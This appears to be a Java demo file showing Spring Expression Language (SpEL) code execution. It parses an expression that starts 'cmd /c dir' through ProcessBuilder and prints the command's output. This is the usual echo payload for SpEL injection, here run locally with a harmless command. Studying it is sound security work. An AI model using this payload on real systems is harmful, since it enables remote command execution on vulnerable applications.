package org.example;

import org.springframework.expression.Expression;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;

public class SpELEcho {
    public static void main(String[] args) {
        ExpressionParser parser = new SpelExpressionParser();//创建解析器
        Expression exp = parser.parseExpression("new java.util.Scanner(new java.lang.ProcessBuilder(\"cmd\", \"/c\", \"dir\", \".\\\\\").start().getInputStream(), \"GBK\").useDelimiter(\"asfsfsdfsf\").next()");//解析表达式
        System.out.println( exp.getValue() );//取值，Hello World！
    }
}
